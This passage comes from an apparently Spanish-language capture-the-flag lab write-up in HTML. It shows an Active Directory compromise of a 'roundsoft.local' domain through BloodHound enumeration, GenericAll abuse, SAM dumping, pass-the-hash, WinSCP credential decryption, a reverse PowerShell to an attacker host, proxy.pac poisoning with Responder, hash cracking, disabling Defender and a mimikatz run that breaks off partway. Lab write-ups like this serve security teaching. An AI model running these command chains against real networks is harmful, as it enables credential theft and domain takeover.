+<h4 class="post-title">RPG{l3ave_my_hash3s_al0ne!}</h4><br>
+
+<p class="plain-text">Las credenciales de <code class="language-plaintext highlighter-rouge">ruby_adm</code> que encontramos son validas a nivel de dominio</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ crackmapexec </span><span class="p">smb shinra.roundsoft.local -u ruby_adm -p b3aut1fu1_lyk_@_g3m!
+</span><span class="az">SMB         </span><span class="p">roundsoft.local 445    SHINRA           </span><span class="az">[*] </span><span class="p">Windows Server 2016 Standard 14393 x64 (name:SHINRA) (domain:Roundsoft.local) (signing:True) (SMBv1:True)  
+</span><span class="az">SMB         </span><span class="p">roundsoft.local 445    SHINRA           </span><span class="ve">[+] </span><span class="p">Roundsoft.local\ruby_adm:b3aut1fu1_lyk_@_g3m!</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Para enumerar el dominio usaremos <code class="language-plaintext highlighter-rouge">bloodhound</code> autenticandonos como cualquier usuario del dominio, toda la informacion recolectada la guardaremos en un <code class="language-plaintext highlighter-rouge">zip</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ bloodhound-python </span><span class="p">-u ruby_adm -p b3aut1fu1_lyk_@_g3m! -ns 192.168.125.128 -d roundsoft.local -c All --zip  
+INFO: Found AD domain: roundsoft.local
+INFO: Getting TGT for user
+INFO: Connecting to LDAP server: Shinra.Roundsoft.local
+INFO: Found 1 domains
+INFO: Found 1 domains in the forest
+INFO: Found 3 computers
+INFO: Connecting to LDAP server: Shinra.Roundsoft.local
+INFO: Found 117 users
+INFO: Found 56 groups
+INFO: Found 3 gpos
+INFO: Found 2 ous
+INFO: Found 19 containers
+INFO: Found 0 trusts
+INFO: Starting computer enumeration with 10 workers
+INFO: Querying computer: GELUS.Roundsoft.local
+INFO: Querying computer: Lux.Roundsoft.local
+INFO: Querying computer: Shinra.Roundsoft.local
+INFO: Done in 00M 39S
+INFO: Compressing output into 20230825230949_bloodhound.zip</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Subimos el zip y partiendo del usuario <code class="language-plaintext highlighter-rouge">ruby_adm</code> nos encontramos con privilegios <code class="language-plaintext highlighter-rouge">GenericAll</code> sobre <code class="language-plaintext highlighter-rouge">100</code> usuarios del dominio, la mayoria no nos sirven de nada</p>
+<a href="/endgames/rpg/21.png" target="_blank"><div><p><img src="/endgames/rpg/21.png"></p></div></a>
+
+<p class="plain-text">Podemos partir buscando por rutas con los usuarios que formen parte del grupo <code class="language-plaintext highlighter-rouge">Developers</code> ya que estos son administradores locales en el equipo <code class="language-plaintext highlighter-rouge">LUX</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\janderson\Documents> </span><span class="am">net </span><span class="p">localgroup Administrators
+
+Alias name     Administrators
+Comment        Administrators have complete and unrestricted access to the computer/domain  
+
+Members
+
+-------------------------------------------------------------------------------
+Administrator
+ROUNDSOFT\Developers
+ROUNDSOFT\Domain Admins
+Roundsoft_HR
+
+The command completed successfully.
+
+PS C:\Users\janderson\Documents></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Tenemos <code class="language-plaintext highlighter-rouge">GenericAll</code> sobre 2 usuarios que forman pate del grupo <code class="language-plaintext highlighter-rouge">Developers</code></p>
+<a href="/endgames/rpg/22.png" target="_blank"><div><p><img src="/endgames/rpg/22.png"></p></div></a>
+
+<p class="plain-text">El plan es sencillo, cambiarle la contraseña a un usuario en este caso <code class="language-plaintext highlighter-rouge">lthomson</code> y autenticarnos con el, pero nos devuelve que el usuario esta <code class="language-plaintext highlighter-rouge">deshabilitado</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ net </span><span class="p">rpc password lthomson password123# -U </span><span class="am">'roundsoft.local/ruby_adm%b3aut1fu1_lyk_@_g3m!'</span><span class="p"> -S shinra.roundsoft.local
+
+</span><span class="ve">❯ crackmapexec </span><span class="p">smb shinra.roundsoft.local -u lthomson -p password123#
+</span><span class="az">SMB         </span><span class="p">roundsoft.local 445    SHINRA           </span><span class="az">[*] </span><span class="p">Windows Server 2016 Standard 14393 x64 (name:SHINRA) (domain:Roundsoft.local) (signing:True) (SMBv1:True)  
+</span><span class="az">SMB         </span><span class="p">roundsoft.local 445    SHINRA           </span><span class="sa">[-] </span><span class="p">Roundsoft.local\lthomson:password123# STATUS_ACCOUNT_DISABLED</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al tener <code class="language-plaintext highlighter-rouge">GenericAll</code> sobre estos tambien podemos habilitarlos, subimos <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1">PowerView</a> a una maquina y con la credencial de <code class="language-plaintext highlighter-rouge">ruby_adm</code> habilitamos al usuario <code class="language-plaintext highlighter-rouge">lthomson</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\rrodriguez\Documents> </span><span class="am">Import-Module </span><span class="p">.\PowerView.ps1
+PS C:\Users\rrodriguez\Documents> </span><span class="ve">$SecPassword </span><span class="c1">= </span><span class="am">ConvertTo-SecureString </span><span class="az">'b3aut1fu1_lyk_@_g3m!' </span><span class="c1">-AsPlainText -Force</span><span class="p">
+PS C:\Users\rrodriguez\Documents> </span><span class="ve">$Cred </span><span class="c1">= </span><span class="am">New-Object </span><span class="p">System.Management.Automation.PSCredential(</span><span class="az">'roundsoft.local\ruby_adm'</span><span class="p">, </span><span class="ve">$SecPassword</span><span class="p">)  
+PS C:\Users\rrodriguez\Documents> </span><span class="am">Set-DomainObject </span><span class="c1">-Identity </span><span class="p">LThomson </span><span class="c1">-XOR </span><span class="p">@{useraccountcontrol=2} </span><span class="c1">-Cred </span><span class="ve">$Cred</span><span class="p">
+PS C:\Users\rrodriguez\Documents></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Si ahora probamos las credenciales contra el <code class="language-plaintext highlighter-rouge">DC</code> nos devuelve que son validas</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ crackmapexec </span><span class="p">smb shinra.roundsoft.local -u lthomson -p password123#
+</span><span class="az">SMB         </span><span class="p">roundsoft.local 445    SHINRA           </span><span class="az">[*] </span><span class="p">Windows Server 2016 Standard 14393 x64 (name:SHINRA) (domain:Roundsoft.local) (signing:True) (SMBv1:True)  
+</span><span class="az">SMB         </span><span class="p">roundsoft.local 445    SHINRA           </span><span class="ve">[+] </span><span class="p">Roundsoft.local\lthomson:password123#</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ya con el usuario activado al autenticarnos contra <code class="language-plaintext highlighter-rouge">LUX</code> y ser administradores nos devuelve un <code class="language-plaintext highlighter-rouge">Pwn3d!</code> asi que podemos dumpear la <code class="language-plaintext highlighter-rouge">sam</code> y ver los hashes NT</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ crackmapexec </span><span class="p">smb lux.roundsoft.local -u lthomson -p password123# 
+</span><span class="az">SMB         </span><span class="p">lux.roundsoft.local 445    LUX              </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 18362 x64 (name:LUX) (domain:Roundsoft.local) (signing:False) (SMBv1:False)
+</span><span class="az">SMB         </span><span class="p">lux.roundsoft.local 445    LUX              </span><span class="ve">[+] </span><span class="p">Roundsoft.local\lthomson:password123# </span><span class="am">(Pwn3d!)</span><span class="p">  
+
+</span><span class="ve">❯ crackmapexec </span><span class="p">smb lux.roundsoft.local -u lthomson -p password123# --sam
+</span><span class="az">SMB         </span><span class="p">lux.roundsoft.local 445    LUX              </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 18362 x64 (name:LUX) (domain:Roundsoft.local) (signing:False) (SMBv1:False)  
+</span><span class="az">SMB         </span><span class="p">lux.roundsoft.local 445    LUX              </span><span class="ve">[+] </span><span class="p">Roundsoft.local\lthomson:password123# </span><span class="am">(Pwn3d!)</span><span class="p">
+</span><span class="az">SMB         </span><span class="p">lux.roundsoft.local 445    LUX              </span><span class="az">[*] </span><span class="p">Dumping SAM hashes
+</span><span class="az">SMB         </span><span class="p">lux.roundsoft.local 445    LUX              </span><span class="am">Administrator:500:aad3b435b51404eeaad3b435b51404ee:53ff2611f458c331e1ecbb3921b7b471:::
+</span><span class="az">SMB         </span><span class="p">lux.roundsoft.local 445    LUX              </span><span class="am">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+</span><span class="az">SMB         </span><span class="p">lux.roundsoft.local 445    LUX              </span><span class="am">DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+</span><span class="az">SMB         </span><span class="p">lux.roundsoft.local 445    LUX              </span><span class="am">WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:e1c935bfda72ce05c46592bcbaea4ad3:::
+</span><span class="az">SMB         </span><span class="p">lux.roundsoft.local 445    LUX              </span><span class="am">Roundsoft_HR:1001:aad3b435b51404eeaad3b435b51404ee:e5562111cec252d79c2205f7ede6beba:::</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Podemos simplemente conectarnos con el hash de <code class="language-plaintext highlighter-rouge">Administrator</code> con evil-winrm</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ evil-winrm </span><span class="p">-i lux.roundsoft.local -u Administrator -H 53ff2611f458c331e1ecbb3921b7b471  
+PS C:\Users\Administrator\Documents> </span><span class="am">whoami</span><span class="p">
+lux\administrator
+PS C:\Users\Administrator\Documents></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">El usuario <code class="language-plaintext highlighter-rouge">yamano</code> toene instalado <code class="language-plaintext highlighter-rouge">WinSCP</code> en su version de escritorio por lo que es muy probable que sus credenciales se hayan guardado en los <code class="language-plaintext highlighter-rouge">registros</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\yamano\AppData\Local\Programs\WinSCP> </span><span class="am">dir</span><span class="p">
+
+    Directory: C:\Users\yamano\AppData\Local\Programs\WinSCP
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----        5/27/2020   1:49 PM                Extensions
+d-----        5/27/2020   1:49 PM                PuTTY
+d-----        5/27/2020   1:49 PM                Translations
+-a----        4/27/2020  11:43 AM         486904 DragExt64.dll  
+-a----        4/23/2020   2:39 PM          37852 license.txt
+-a----        5/27/2020   1:49 PM          87298 unins000.dat
+-a----        5/27/2020   1:48 PM        2669760 unins000.exe
+-a----        5/27/2020   1:49 PM          23383 unins000.msg
+-a----        4/27/2020  11:41 AM         285424 WinSCP.com
+-a----        4/27/2020  11:40 AM       26836592 WinSCP.exe
+-a----        4/27/2020  11:39 AM       12143294 WinSCP.map
+-a----        4/27/2020  11:41 AM         151880 WinSCPnet.dll
+
+PS C:\Users\yamano\AppData\Local\Programs\WinSCP></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Iniciaremos descargando el archivo <code class="language-plaintext highlighter-rouge">NTUSER.DAT</code> del usuario yamano para analizarlo</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\yamano> </span><span class="am">download </span><span class="p">NTUSER.DAT NTUSER.DAT
+</span><span class="az">
+Info: Downloading C:\Users\yamano\NTUSER.DAT to NTUSER.DAT
+
+Info: Download successful!
+</span><span class="p">
+PS C:\Users\yamano></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Usando <a href="https://www.sans.org/tools/registry-explorer">Registry Explorer</a> podemos encontrar en la sesion de <code class="language-plaintext highlighter-rouge">WinSCP</code> la credencial</p>
+<a href="/endgames/rpg/31.png" target="_blank"><div><p><img src="/endgames/rpg/31.png"></p></div></a>
+
+<p class="plain-text">Usando <a href="https://github.com/anoopengineer/winscppasswd">winscppasswd</a> podemos decifrar la contraseña en base a los datos que obtenemos en el <code class="language-plaintext highlighter-rouge">registro</code> de winscp, obtenemos una contraseña en texto plano</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\pc1\Desktop> </span><span class="am">.\winscppasswd.exe </span><span class="p">192.168.125.135 yamano A35C7059DC0FAE8584253D313D32336D656E726D6A64726D6E69726D6F691D2E6B03350F033A1C32281C2F286D3F033E6F3D292825  
+Ar7_iS_f@nt@st1c_b3auty
+PS C:\Users\pc1\Desktop></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">La credencial es valida, sin embargo este usuario no se puede conectar a traves del protocolo <code class="language-plaintext highlighter-rouge">winrm</code> a ninguno de los equipos que nos restan de comprometer</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ crackmapexec </span><span class="p">smb shinra.roundsoft.local -u yamano -p Ar7_iS_f@nt@st1c_b3auty
+</span><span class="az">SMB         </span><span class="p">roundsoft.local 445    SHINRA           </span><span class="az">[*] </span><span class="p">Windows Server 2016 Standard 14393 x64 (name:SHINRA) (domain:Roundsoft.local) (signing:True) (SMBv1:True)  
+</span><span class="az">SMB         </span><span class="p">roundsoft.local 445    SHINRA           </span><span class="ve">[+] </span><span class="p">Roundsoft.local\yamano:Ar7_iS_f@nt@st1c_b3auty
+
+</span><span class="ve">❯ crackmapexec </span><span class="p">winrm 192.168.125.88-128 -u yamano -p Ar7_iS_f@nt@st1c_b3auty
+</span><span class="az">SMB         </span><span class="p">192.168.125.88  5985   GELUS            </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 (name:GELUS) (domain:Roundsoft.local)
+</span><span class="az">SMB         </span><span class="p">192.168.125.128 5985   SHINRA           </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 14393 (name:SHINRA) (domain:Roundsoft.local)
+</span><span class="az">HTTP        </span><span class="p">192.168.125.88  5985   GELUS            </span><span class="az">[*] </span><span class="p">http://192.168.125.88:5985/wsman
+</span><span class="az">HTTP        </span><span class="p">192.168.125.128 5985   SHINRA           </span><span class="az">[*] </span><span class="p">http://192.168.125.128:5985/wsman
+</span><span class="az">HTTP        </span><span class="p">192.168.125.88  5985   GELUS            </span><span class="ro">[-] </span><span class="p">Roundsoft.local\yamano:Ar7_iS_f@nt@st1c_b3auty 
+</span><span class="az">HTTP        </span><span class="p">192.168.125.128 5985   SHINRA           </span><span class="ro">[-] </span><span class="p">Roundsoft.local\yamano:Ar7_iS_f@nt@st1c_b3auty</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Sin embargo utilizando <a href="https://github.com/antonioCoco/RunasCs">Invoke-RunasCs</a> logramos ejecutar comandos como este usuario localmente en el equipo <code class="language-plaintext highlighter-rouge">GELUS</code>, en este caso un simple whoami para probar</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\rrodriguez\Documents> </span><span class="am">curl </span><span class="p">10.10.14.10/Invoke-RunasCs.ps1</span><span class="c1"> -o </span><span class="p">Invoke-RunasCs.ps1  
+PS C:\Users\rrodriguez\Documents> </span><span class="am">Import-Module</span><span class="p"> .\Invoke-RunasCs.ps1
+PS C:\Users\rrodriguez\Documents> </span><span class="am">Invoke-RunasCs </span><span class="p">yamano Ar7_iS_f@nt@st1c_b3auty whoami
+roundsoft\yamano
+PS C:\Users\rrodriguez\Documents></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Utilizando el parametro <code class="language-plaintext highlighter-rouge">-Remote</code> del propio RunasCs nos enviamos una <code class="language-plaintext highlighter-rouge">powershell</code> aprovechando que tenemos conexion directa con nuestro equipo desde aqui</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\rrodriguez\Documents> </span><span class="am">Invoke-RunasCs </span><span class="p">yamano Ar7_iS_f@nt@st1c_b3auty powershell </span><span class="c1">-Remote </span><span class="p">10.10.14.10:443
+[+] Running in session 0 with process function CreateProcessWithTokenW()
+[+] Using Station\Desktop: Service-0x0-27fbfef$\Default
+[+] Async process 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' with pid 7192 created in background.  
+PS C:\Users\rrodriguez\Documents></span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ sudo netcat </span><span class="p">-lvnp 443
+Listening on 0.0.0.0 443
+Connection received on 10.13.38.19
+Windows PowerShell 
+Copyright (C) Microsoft Corporation. All rights reserved.  
+
+PS C:\Windows\system32> </span><span class="am">whoami</span><span class="p">
+roundsoft\yamano
+PS C:\Windows\system32> </span><span class="am">hostname</span><span class="p">
+GELUS
+PS C:\Windows\system32></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Navegando el directorio <code class="language-plaintext highlighter-rouge">inetpub</code> encontramos un archivo <code class="language-plaintext highlighter-rouge">proxy.pac</code> que almacena informacion sobre que a proxy redirigir mediante un script en <code class="language-plaintext highlighter-rouge">JavaScript</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\inetpub\altroot\pac_testing> </span><span class="am">dir</span><span class="p">
+
+    Directory: C:\inetpub\altroot\pac_testing
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        5/22/2020  12:02 AM            118 proxy.pac            
+
+PS C:\inetpub\altroot\pac_testing> </span><span class="am">type </span><span class="p">proxy.pac
+function FindProxyForURL(url, host) 
+{
+	// allow DIRECT for now, yamano to setup proxy server 
+	return "DIRECT";
+}
+PS C:\inetpub\altroot\pac_testing></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Este archivo puede ser modificado por el grupo <code class="language-plaintext highlighter-rouge">Infra</code>, al cual el usuario <code class="language-plaintext highlighter-rouge">yamano</code> como el que estamos actualmente pertenece, asi que podemos <code class="language-plaintext highlighter-rouge">escribir</code> en el</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\inetpub\altroot\pac_testing> </span><span class="am">icacls </span><span class="p">proxy.pac
+proxy.pac ROUNDSOFT\Infra:(W)
+          ROUNDSOFT\Infra:(I)(RX)
+          BUILTIN\IIS_IUSRS:(I)(RX)
+          NT AUTHORITY\IUSR:(I)(RX)
+          BUILTIN\Administrators:(I)(F)
+          NT AUTHORITY\SYSTEM:(I)(F)
+          NT SERVICE\TrustedInstaller:(I)(F)
+
+Successfully processed 1 files; Failed processing 0 files
+PS C:\inetpub\altroot\pac_testing> </span><span class="am">Get-ADPrincipalGroupMembership </span><span class="p">yamano | </span><span class="am">Select </span><span class="p">Name  
+
+Name
+----
+Domain Users
+Developers
+Infra
+
+PS C:\inetpub\altroot\pac_testing></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Responder cuenta con el pamrametro <code class="language-plaintext highlighter-rouge">-P</code> para el proxy que estara en el puerto <code class="language-plaintext highlighter-rouge">3128</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ sudo responder</span><span class="p"> -I tun0 -P
+                                         __
+  .----.-----.-----.-----.-----.-----.--|  |.-----.----. 
+  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _| 
+  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
+                   |__|
+
+</span><span class="am">           NBT-NS, LLMNR & MDNS Responder 3.1.3.0
+
+</span><span class="ve">[+] </span><span class="p">Listening for events...</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Modificamos el archivo <code class="language-plaintext highlighter-rouge">proxy.pac</code> para que tome como proxy nuestro host por el puerto <code class="language-plaintext highlighter-rouge">3128</code> donde esta en escucha responder que forzara una <code class="language-plaintext highlighter-rouge">autenticacion</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\inetpub\altroot\pac_testing> </span><span class="am">echo </span><span class="az">'function FindProxyForURL(url, host){ return "PROXY 10.10.14.10:3128; DIRECT"; }' </span><span class="p">> proxy.pac  
+PS C:\inetpub\altroot\pac_testing> </span><span class="am">type </span><span class="p">proxy.pac
+function FindProxyForURL(url, host){ return "PROXY 10.10.14.10:3128; DIRECT"; }
+PS C:\inetpub\altroot\pac_testing></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Despues de un par de minutos recibimos un hash <code class="language-plaintext highlighter-rouge">NTLMv2</code> del usuario <code class="language-plaintext highlighter-rouge">AThompson</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ sudo responder</span><span class="p"> -I tun0 -P
+                                         __
+  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
+  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
+  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
+                   |__|
+
+</span><span class="am">           NBT-NS, LLMNR & MDNS Responder 3.1.3.0
+
+</span><span class="ve">[+] </span><span class="p">Listening for events...
+
+</span><span class="az">[Proxy-Auth] </span><span class="p">NTLMv2 Client   : </span><span class="am">10.13.38.19
+</span><span class="az">[Proxy-Auth] </span><span class="p">NTLMv2 Username : </span><span class="am">ROUNDSOFT\AThompson
+</span><span class="az">[Proxy-Auth] </span><span class="p">NTLMv2 Hash     : </span><span class="am">ATHOMPSON::ROUNDSOFT:1122334455667788:3226D5ADD8CEC459E58BCB2A944E4416:0101000000000000003525685CD8D901466A01CE2E0CBE4400000000020008004F0053005A00430001001E00570049004E002D00330055003800590030004E004600590033004C00350004003400570049004E002D00330055003800590030004E004600590033004C0035002E004F0053005A0043002E004C004F00430041004C00030014004F0053005A0043002E004C004F00430041004C00050014004F0053005A0043002E004C004F00430041004C0007000800003525685CD8D90106000400020000000800300030000000000000000000000000300000A0E6542D491037E632B42B69C0AC5B75A6B6336276CAB6008B4C1EB3B07788A10A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310034002E0032000000000000000000  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">De primeras <code class="language-plaintext highlighter-rouge">john</code> no logra romper el hash con el <code class="language-plaintext highlighter-rouge">rockyou.txt</code> sin embargo al aplicar algunas <code class="language-plaintext highlighter-rouge">reglas</code> obtenemos la contraseña para el usuario <code class="language-plaintext highlighter-rouge">AThompson</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ john </span><span class="p">-w:/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt hash --rules:d3ad0ne
+Using default input encoding: UTF-8
+Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
+Press 'q' or Ctrl-C to abort, almost any other key for status
+</span><span class="am">sshhiinnoobbii!!</span><span class="p"> (</span><span class="am">ATHOMPSON</span><span class="p">)
+Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably  
+Session completed.</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Curiosamente el usuario <code class="language-plaintext highlighter-rouge">AThomson</code> es un administrador local en el equipo <code class="language-plaintext highlighter-rouge">GELUS</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\yamano\Documents> </span><span class="am">net </span><span class="p">localgroup Administrators
+Alias name     Administrators
+Comment        Administrators have complete and unrestricted access to the computer/domain  
+
+Members
+
+-------------------------------------------------------------------------------
+Administrator
+ROUNDSOFT\AThompson
+ROUNDSOFT\Domain Admins
+
+The command completed successfully.
+
+PS C:\Users\yamano\Documents></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al ser administrador local en <code class="language-plaintext highlighter-rouge">GELUS</code> al autenticarnos a este equipo nos devuelve un <code class="language-plaintext highlighter-rouge">Pwn3d!</code> por lo que podemos dumpear la <code class="language-plaintext highlighter-rouge">sam</code> y ver todos los hashes NT</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ crackmapexec </span><span class="p">smb gelus.roundsoft.local -u athompson -p </span><span class="am">'sshhiinnoobbii!!'</span><span class="p">
+</span><span class="az">SMB         </span><span class="p">gelus.roundsoft.local 445    GELUS            </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:GELUS) (domain:Roundsoft.local) (signing:False) (SMBv1:False)  
+</span><span class="az">SMB         </span><span class="p">gelus.roundsoft.local 445    GELUS            </span><span class="ve">[+] </span><span class="p">Roundsoft.local\athompson:sshhiinnoobbii!! </span><span class="am">(Pwn3d!)</span><span class="p">
+
+</span><span class="ve">❯ crackmapexec </span><span class="p">smb gelus.roundsoft.local -u athompson -p </span><span class="am">'sshhiinnoobbii!!'</span><span class="p"> --sam
+</span><span class="az">SMB         </span><span class="p">gelus.roundsoft.local 445    GELUS            </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:GELUS) (domain:Roundsoft.local) (signing:False) (SMBv1:False)  
+</span><span class="az">SMB         </span><span class="p">gelus.roundsoft.local 445    GELUS            </span><span class="ve">[+] </span><span class="p">Roundsoft.local\athompson:sshhiinnoobbii!! </span><span class="am">(Pwn3d!)
+</span><span class="az">SMB         </span><span class="p">gelus.roundsoft.local 445    GELUS            </span><span class="az">[*] </span><span class="p">Dumping SAM hashes
+</span><span class="az">SMB         </span><span class="p">gelus.roundsoft.local 445    GELUS            </span><span class="am">Administrator:500:aad3b435b51404eeaad3b435b51404ee:e3e6f84b9fbe9eef55078e76115b3a9c:::
+</span><span class="az">SMB         </span><span class="p">gelus.roundsoft.local 445    GELUS            </span><span class="am">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+</span><span class="az">SMB         </span><span class="p">gelus.roundsoft.local 445    GELUS            </span><span class="am">DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+</span><span class="az">SMB         </span><span class="p">gelus.roundsoft.local 445    GELUS            </span><span class="am">WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:b89195ed259b08446b62a25dc930530b:::</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Podemos simplemente conectarnos con el hash NT del usuario <code class="language-plaintext highlighter-rouge">Administrator</code> haciendo un passthehash con <code class="language-plaintext highlighter-rouge">evil-winrm</code> y leer finalmente la flag en el escritorio</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ evil-winrm</span><span class="p"> -i gelus.roundsoft.local -u Administrator -H e3e6f84b9fbe9eef55078e76115b3a9c  
+PS C:\Users\Administrator\Documents> </span><span class="am">whoami</span><span class="p">
+gelus\administrator
+PS C:\Users\Administrator\Documents> </span><span class="am">type </span><span class="p">..\Desktop\flag.txt
+RPG{l3ave_my_hash3s_al0ne!}
+PS C:\Users\Administrator\Documents></span>
+</code></pre></div></div><br>
+
+</section>
+
+<section class="post" id="flag6">
+<br><h3 class="post-title">Collapse of the empire</h3>
+<h4 class="post-title">RPG{WhY_w0rK_h@rD_Wh3N_U_c@N_d3l3g@7e?}</h4><br>
+
+<p class="plain-text">Para evitar problemas ya que somos administradores desactivaremos el <code class="language-plaintext highlighter-rouge">antivirus</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\Administrator\Documents> </span><span class="am">Set-MpPreference </span><span class="c1">-DisableRealTimeMonitoring </span><span class="ve">$true </span><span class="c1">-DisableIOAVProtection </span><span class="ve">$true</span><span class="p">
+PS C:\Users\Administrator\Documents> </span><span class="am">cmd</span><span class="p"> /c </span><span class="az">"C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2004.6-0\MpCmdRun.exe" </span><span class="c1">-RemoveDefinitions -All  </span><span class="p">
+
+Service Version: 4.18.2203.5
+Engine Version: 1.1.19200.5
+AntiSpyware Signature Version: 1.363.1464.0
+AntiVirus Signature Version: 1.363.1464.0
+
+Starting engine and signature rollback to none...
+Done!
+
+PS C:\Users\Administrator\Documents></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Subimos <code class="language-plaintext highlighter-rouge">mimikatz</code> y dumpeamos las <code class="language-plaintext highlighter-rouge">logonpasswords</code>, encontramos varios hashes interesantes, pero resalta uno que antes no teniamos y es el hash del usuario <code class="language-plaintext highlighter-rouge">jops</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\Administrator\Documents> </span><span class="am">upload </span><span class="p">mimikatz.exe
+</span><span class="az">
+Info: Uploading mimikatz.exe to C:\Users\Administrator\Documents\mimikatz.exe
+</span><span class="sa">
+Data: 1807016 bytes of 1807016 bytes copied
+</span><span class="az">
+Info: Upload successful!
+</span><span class="p">
+PS C:\Users\Administrator\Documents> </span><span class="am">.\mimikatz.exe </span><span class="az">"sekurlsa::logonPasswords"</span><span class="p"> exit
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz(commandline) # sekurlsa::logonPasswords
+
